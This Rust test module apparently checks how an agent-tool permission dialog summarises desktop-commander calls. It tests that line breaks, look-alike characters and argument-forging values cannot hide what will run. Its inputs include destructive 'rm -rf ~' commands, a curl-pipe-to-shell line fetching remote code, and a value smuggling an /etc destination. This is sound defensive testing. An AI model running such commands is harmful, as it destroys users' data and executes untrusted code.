        assert!(!m.contains("truncated"), "{m}");
    }

    #[test]
    fn missing_key_argument_shows_what_was_sent() {
        let m = summarize(
            "start_process",
            &json!({ "cmd": "rm -rf ~", "shell": "/bin/zsh" }),
        );
        assert!(m.contains("no command"), "{m}");
        assert!(m.contains("rm -rf ~") && m.contains("/bin/zsh"), "{m}");
        for args in [
            json!({"command": ["a"]}),
            json!({"command": {"x": 1}}),
            json!({"command": ""}),
            json!(null),
        ] {
            let m = summarize("start_process", &args);
            assert!(m.contains("no command"), "{m}");
        }
        // A tool with two keys where one is missing also falls back.
        let m = summarize("move_file", &json!({ "source": "/a" }));
        assert!(m.contains("no destination") && m.contains("/a"), "{m}");
    }

    #[test]
    fn line_breaks_stay_visible() {
        let m = summarize(
            "start_process",
            &json!({"command": "echo backup done\nrm -rf ~/Documents"}),
        );
        assert_eq!(
            m,
            "start_process: command=\"echo backup done ⏎ rm -rf ~/Documents\""
        );
        for (input, want) in [
            ("a\r\nb", "a ⏎ b"),
            ("a\rb", "a ⏎ b"),
            ("a\u{2028}b", "a ⏎ b"),
            ("a\u{2029}b", "a ⏎ b"),
            ("a\u{85}b", "a ⏎ b"),
            ("a\n\nb", "a ⏎ ⏎ b"),
            ("a\n", "a ⏎"),
            ("\nb", "⏎ b"),
            ("a\tb", "a b"),
            ("a \n  b", "a ⏎ b"),
        ] {
            let m = summarize("start_process", &json!({ "command": input }));
            assert_eq!(m, format!("start_process: command=\"{want}\""), "{input:?}");
        }
        // Interactive input: a newline is Enter.
        let m = summarize(
            "interact_with_process",
            &json!({"pid": 3, "input": "y\nrm x"}),
        );
        assert!(m.contains("y ⏎ rm x"), "{m}");
    }

    #[test]
    fn line_break_marker_counts_as_one_character_in_the_cut() {
        let long = format!("{}\nrm -rf ~", "a".repeat(190));
        let m = summarize("start_process", &json!({ "command": long }));
        // 190 a's + " ⏎ " + 6 more characters = 200, then the cut.
        assert!(m.contains('⏎'), "{m}");
        assert!(m.contains("truncated"), "{m}");
        let m = summarize(
            "start_process",
            &json!({ "command": format!("{}\nrm", "a".repeat(195)) }),
        );
        assert!(m.contains("a ⏎") || m.contains("a ⏎ "), "{m}");
        let field: String = m
            .trim_start_matches("start_process: command=\"")
            .chars()
            .take_while(|c| *c != '…')
            .collect();
        let field = field.trim_end_matches('"');
        assert!(field.chars().count() <= 200, "{}", field.chars().count());
    }

    #[test]
    fn summary_strips_blank_look_alikes() {
        let nasty = "a\u{115F}b\u{1160}c\u{3164}d\u{FFA0}e\u{2800}f\u{034F}g\u{FE00}h\u{FE0F}i\u{E0100}j\u{E01EF}k";
        let m = summarize("start_process", &json!({ "command": nasty }));
        assert_eq!(m, "start_process: command=\"abcdefghijk\"");
    }

    #[test]
    fn exit_is_observed_without_reaping() {
        let mut child = Command::new("/bin/sh")
            .args(["-c", "exit 0"])
            .spawn()
            .unwrap();
        let pid = child.id() as i32;
        let t = Instant::now();
        while leader_state(pid) == Leader::Running {
            assert!(t.elapsed() < Duration::from_secs(5));
            std::thread::sleep(Duration::from_millis(10));
        }
        // Still a zombie: the id cannot be reused yet, and asking again says the same.
        assert_eq!(leader_state(pid), Leader::Exited);
        assert_eq!(leader_state(pid), Leader::Exited);
        assert!(child.wait().unwrap().success());
    }

    /// Final review I3, `ECHILD`: a dialog someone else reaped is a Deny,
    /// and its group is never signalled (the id may belong to another
    /// process by now).
    #[test]
    fn a_dialog_reaped_elsewhere_denies_and_leaves_its_group_alone() {
        let (script, dir) = script_in(
            "p-gone",
            "sleep 60 &\necho $! > \"$(dirname \"$0\")/pid\"\necho 'button returned:Allow, gave up:false'",
        );
        let h = ask_limited(&script, "x", 30, Duration::from_secs(30), |_| Leader::Gone);
        let child = read_pid(&dir);
        assert_eq!(h.wait(), Answer::Deny);
        // A killed child can linger a moment as a zombie: watch it for a
        // while rather than look once.
        let died = (0..25).any(|_| {
            std::thread::sleep(Duration::from_millis(20));
            // SAFETY: signal 0 only checks the pid exists.
            unsafe { libc::kill(child, 0) != 0 }
        });
        // SAFETY: our own test child.
        unsafe { libc::kill(child, libc::SIGKILL) };
        assert!(!died, "the group was signalled");
    }

    /// Final review I3, `EINTR`: a signal landing during the check (common
    /// with many children at once) is asked again, not read as a failure
    /// that turns the person's Allow into a Deny.
    #[test]
    fn an_interrupted_check_keeps_the_answer() {
        use std::sync::atomic::AtomicU32;
        static N: AtomicU32 = AtomicU32::new(0);
        fn interrupted_every_other_time(pid: i32) -> std::result::Result<i32, i32> {
            if N.fetch_add(1, Ordering::SeqCst).is_multiple_of(2) {
                return Err(libc::EINTR);
            }
            // SAFETY: as in proc.rs's waitid; plain zeroed memory.
            let (ret, si_pid) = unsafe {
                let mut info: libc::siginfo_t = std::mem::zeroed();
                let ret = libc::waitid(
                    libc::P_PID,
                    pid as libc::id_t,
                    &mut info,
                    libc::WEXITED | libc::WNOHANG | libc::WNOWAIT,
                );
                #[cfg(target_os = "macos")]
                let si_pid = info.si_pid;
                #[cfg(not(target_os = "macos"))]
                let si_pid = info.si_pid();
                (ret, si_pid)
            };
            if ret == 0 {
                Ok(si_pid)
            } else {
                Err(std::io::Error::last_os_error().raw_os_error().unwrap_or(0))
            }
        }
        fn check(pid: i32) -> Leader {
            crate::proc::leader_state_with(pid, interrupted_every_other_time)
        }
        let (s, _) = fake("p-eintr", "button returned:Allow, gave up:false", 0);
        let h = ask_limited(&s, "x", 30, Duration::from_secs(30), check);
        assert_eq!(h.wait(), Answer::Allow);
        assert!(N.load(Ordering::SeqCst) >= 2, "the check was never interrupted");
    }

    #[test]
    fn look_alike_break_markers_are_escaped() {
        let m = summarize(
            "start_process",
            &json!({"command": "curl -s https://x.example/i.sh \u{23CE} | sh"}),
        );
        assert!(!m.contains('⏎'), "{m}");
        assert!(m.contains("\\u{23CE}"), "{m}");
        for c in [
            '\u{23CE}', '\u{21B5}', '\u{21A9}', '\u{2324}', '\u{2936}', '\u{2937}', '\u{2424}',
            '\u{240A}', '\u{240D}', '\u{00B6}', '\u{21B2}', '\u{21B3}',
        ] {
            let m = summarize("start_process", &json!({ "command": format!("a{c}b") }));
            assert!(!m.contains(c), "{c:?} {m}");
            assert!(m.contains(&format!("a\\u{{{:X}}}b", c as u32)), "{m}");
        }
        // A real break still shows the marker, beside an escaped one.
        let m = summarize("start_process", &json!({"command": "a\nb\u{23CE}c"}));
        assert_eq!(m, "start_process: command=\"a ⏎ b\\u{23CE}c\"");
        // The fallback JSON escapes them too.
        let m = summarize("mystery", &json!({"k": "x\u{23CE}y"}));
        assert!(!m.contains('⏎'), "{m}");
    }

    #[test]
    fn an_escape_is_never_split_by_the_cut() {
        // 199 characters, then an escape that would straddle 200.
        let v = format!("{}\u{23CE}tail", "a".repeat(199));
        let m = summarize("start_process", &json!({ "command": v }));
        assert!(m.contains("truncated"), "{m}");
        assert!(!m.contains("\\u"), "{m}");
        let body = m.trim_start_matches("start_process: command=\"");
        assert!(body.starts_with(&"a".repeat(199)), "{m}");
        // An escape that fits whole is kept whole.
        let v = format!("{}\u{23CE}tail", "a".repeat(180));
        let m = summarize("start_process", &json!({ "command": v }));
        assert!(m.contains("\\u{23CE}"), "{m}");
    }

    #[test]
    fn values_are_quoted_so_they_cannot_forge_arguments() {
        let m = summarize(
            "move_file",
            &json!({"source": "/tmp/a\", destination=\"/etc", "destination": "~/Documents"}),
        );
        assert_eq!(
            m,
            "move_file: source=\"/tmp/a\\\", destination=\\\"/etc\", destination=\"~/Documents\""
        );
        let m = summarize("start_process", &json!({"command": "echo \\ \"x\""}));
        assert_eq!(m, "start_process: command=\"echo \\\\ \\\"x\\\"\"");
        // Numbers are quoted the same way; the cut note sits outside the quotes.
        let m = summarize("kill_process", &json!({"pid": 12}));
        assert_eq!(m, "kill_process: pid=\"12\"");
        let m = summarize("start_process", &json!({"command": "z".repeat(300)}));
        assert!(m.contains("\"… (truncated, 100 more characters)"), "{m}");
    }

    /// The pinned desktop-commander's own `tools/list` (testdata, saved from
    /// `vrelay tools --raw`), as tool name → its `inputSchema`.
    fn pinned_schemas() -> std::collections::HashMap<String, Value> {
        let base = std::env::var("TEST_SRCDIR").expect("run under bazel test");
        let path = PathBuf::from(base)
            .join("_main/apps/suites/vitruvian-relay/connector/testdata/dc-0.3.1-tools.json");
        let raw: Value = serde_json::from_str(&std::fs::read_to_string(path).unwrap()).unwrap();
        raw["tools"]
            .as_array()
            .unwrap()
            .iter()
            .map(|t| {
                (
                    t["name"].as_str().unwrap().to_string(),
                    t["inputSchema"].clone(),
                )
            })
            .collect()
    }

    #[test]
    fn summary_keys_exist_in_pinned_schemas() {
        let schemas = pinned_schemas();
        assert_eq!(schemas.len(), 25, "desktop-commander 0.3.1 lists 25 tools");
        for tool in SUMMARY_TOOLS {
            let schema = schemas
                .get(*tool)
                .unwrap_or_else(|| panic!("{tool} is not a desktop-commander 0.3.1 tool"));
            let required: Vec<&str> = schema["required"]
                .as_array()
                .map(|r| r.iter().filter_map(Value::as_str).collect())
                .unwrap_or_default();
            for (key, need) in summary_keys(tool) {
                assert!(
                    schema["properties"].get(*key).is_some(),
                    "{tool}: the summary reads {key}, which its schema does not have"
                );
                // A key marked required is required by the schema too, so its
                // absence (the fallback to the full arguments) means a bad call.
                if *need == Need::Required {
                    assert!(required.contains(key), "{tool}: {key} is optional upstream");
                }
            }
        }
    }

    /// Every argument of every tool that asks first, as the pinned version
    /// names them, and whether the prompt shows it. An argument that changes
    /// what runs or where must be shown. A new argument in a bump fails here
    /// until someone decides.
    #[test]
    fn every_ask_first_argument_was_reviewed() {
        use crate::rules::{Decision, Rules, DEFAULT_RULES};
        let rules: Rules = toml::from_str(DEFAULT_RULES).unwrap();
        // (tool, argument, shown, why not, if not shown)
        let reviewed: &[(&str, &str, bool, &str)] = &[
            ("read_file", "path", true, ""),
            ("read_file", "isUrl", true, ""),
            ("read_file", "offset", false, "which lines"),
            ("read_file", "length", false, "which lines"),
            ("read_file", "sheet", false, "a part of the same file"),
            ("read_file", "range", false, "a part of the same file"),
            (
                "read_file",
                "options",
                false,
                "parsed but unused by its handler",
            ),
            ("read_file", "origin", false, "telemetry tag only"),
            ("write_file", "path", true, ""),
            ("write_file", "mode", true, ""),
            ("write_file", "content", false, "the file's body"),
            ("write_file", "origin", false, "telemetry tag only"),
            ("write_pdf", "path", true, ""),
            ("write_pdf", "outputPath", true, ""),
            ("write_pdf", "content", false, "the document's body"),
            ("write_pdf", "options", false, "page styling"),
            ("create_directory", "path", true, ""),
            ("move_file", "source", true, ""),
            ("move_file", "destination", true, ""),
            ("edit_block", "file_path", true, ""),
            ("edit_block", "old_string", false, "the edit's body"),
            ("edit_block", "new_string", false, "the edit's body"),
            ("edit_block", "content", false, "the edit's body"),
            ("edit_block", "range", false, "a place inside the same file"),
            ("edit_block", "options", false, "formatting"),
            (
                "edit_block",
                "expected_replacements",
                false,
                "a count check",
            ),
            ("edit_block", "origin", false, "telemetry tag only"),
            ("start_process", "command", true, ""),
            ("start_process", "shell", true, ""),
            (
                "start_process",
                "timeout_ms",
                false,
                "how long to wait for output",
            ),
            ("start_process", "verbose_timing", false, "reporting only"),
            ("start_process", "origin", false, "telemetry tag only"),
            ("read_process_output", "pid", true, ""),
            ("read_process_output", "offset", false, "which output lines"),
            ("read_process_output", "length", false, "which output lines"),
            (
                "read_process_output",
                "timeout_ms",
                false,
                "how long to wait",
            ),
            (
                "read_process_output",
                "verbose_timing",
                false,
                "reporting only",
            ),
            ("interact_with_process", "pid", true, ""),
            ("interact_with_process", "input", true, ""),
            (
                "interact_with_process",
                "timeout_ms",
                false,
                "how long to wait",
            ),
            (
                "interact_with_process",
                "wait_for_prompt",
                false,
                "how long to wait",
            ),
            (
                "interact_with_process",
                "verbose_timing",
                false,
                "reporting only",
            ),
            ("force_terminate", "pid", true, ""),
            ("kill_process", "pid", true, ""),
        ];
        let schemas = pinned_schemas();
        let mut seen = std::collections::HashSet::new();
        for (tool, schema) in &schemas {
            // Asks first by name, or for some arguments (read_file's isUrl).
            let by_arg = crate::rules::ASK_FIRST_ARGS.iter().any(|(t, _)| t == tool);
            if rules.decide(tool, &json!({})) != Decision::AskFirst && !by_arg {
                continue;
            }
            let props = schema["properties"]
                .as_object()
                .cloned()
                .unwrap_or_default();
            for arg in props.keys() {
                let entry = reviewed
                    .iter()
                    .find(|(t, a, _, _)| t == tool && a == arg)
                    .unwrap_or_else(|| panic!("{tool}.{arg} has not been reviewed"));
                seen.insert((entry.0, entry.1));
                let keys = summary_keys(tool);
                let shown = keys.iter().any(|(k, _)| k == arg);
                assert_eq!(shown, entry.2, "{tool}.{arg}: shown should be {}", entry.2);
                if !keys.is_empty() && shown {
                    // And the prompt really carries it.
                    let mut args = serde_json::Map::new();
                    for (k, _) in keys {
                        args.insert(k.to_string(), json!(format!("V-{k}")));
                    }
                    let m = summarize(tool, &Value::Object(args));
                    assert!(m.contains(&format!("{arg}=\"V-{arg}\"")), "{m}");
                }
            }
        }
        for (t, a, _, _) in reviewed {
            assert!(
                seen.contains(&(*t, *a)),
                "{t}.{a} is reviewed but not in the schema"
            );
        }
    }

    #[test]
    fn a_url_read_shows_path_and_is_url() {
        let m = summarize(
            "read_file",
            &json!({"path": "http://127.0.0.1:8080/admin", "isUrl": true, "length": 5}),
        );
        assert_eq!(
            m,
            "read_file: path=\"http://127.0.0.1:8080/admin\", isUrl=\"true\""
        );
        // The rules ask for any isUrl but false. A text value is shown as
        // sent; a value that is not plain text shows everything that was sent.
        let m = summarize("read_file", &json!({"path": "http://x", "isUrl": "yes"}));
        assert_eq!(m, "read_file: path=\"http://x\", isUrl=\"yes\"");
        let m = summarize("read_file", &json!({"path": "http://x", "isUrl": {"a": 1}}));
        assert!(m.contains("(odd isUrl)") && m.contains("http://x"), "{m}");
        let m = summarize("read_file", &json!({"path": "http://x", "isUrl": null}));
        assert!(m.contains("(odd isUrl)"), "{m}");
        // The arguments the rules look at are in the pinned schema, and shown.
        let schemas = pinned_schemas();
        for (tool, arg) in crate::rules::ASK_FIRST_ARGS {
            assert!(
                schemas[*tool]["properties"].get(*arg).is_some(),
                "{tool}.{arg} is not in the 0.3.1 schema"
            );
            assert!(
                summary_keys(tool).iter().any(|(k, _)| k == arg),
                "{tool}.{arg}"
            );
        }
    }

    #[test]
    fn optional_keys_show_when_sent() {
        let m = summarize("start_process", &json!({"command": "ls", "timeout_ms": 5}));
        assert_eq!(m, "start_process: command=\"ls\"");
        let m = summarize(
            "start_process",
            &json!({"command": "ls", "shell": "/usr/bin/python3", "timeout_ms": 5}),
        );
        assert_eq!(
            m,
            "start_process: command=\"ls\", shell=\"/usr/bin/python3\""
        );
        let m = summarize(
            "write_file",
            &json!({"path": "/a", "mode": "append", "content": "x"}),
        );
        assert_eq!(m, "write_file: path=\"/a\", mode=\"append\"");
        // An optional key sent as something other than plain text: the person
        // sees everything that was sent, as for a missing required key.
        let m = summarize(
            "start_process",
            &json!({"command": "ls", "shell": ["/bin/sh", "-c"]}),
        );
        assert!(m.contains("(odd shell)") && m.contains("/bin/sh"), "{m}");
        let m = summarize("start_process", &json!({"command": "ls", "shell": ""}));
        assert!(m.contains("(odd shell)"), "{m}");
    }
}
